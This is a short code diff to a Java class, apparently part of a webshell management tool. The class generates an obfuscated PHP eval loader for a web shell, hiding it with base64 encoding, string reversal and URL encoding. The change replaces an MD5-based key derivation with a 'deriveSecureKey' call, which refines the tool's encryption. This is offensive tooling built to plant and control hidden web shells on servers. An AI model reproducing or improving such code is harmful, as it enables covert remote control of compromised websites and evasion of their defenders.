@@ -104,7 +104,7 @@ public class PhpEvalXor implements Cryption {
    }
 
    public String generateEvalContent() {
-      String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace("<?php", "");
+      String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.deriveSecureKey(this.shell.getSecretKey()), false))).replace("<?php", "");
       eval = functions.base64EncodeToString(eval.getBytes());
       eval = (new StringBuffer(eval)).reverse().toString();
       eval = String.format("eval(base64_decode(strrev(urldecode('%s'))));", URLEncoder.encode(eval));
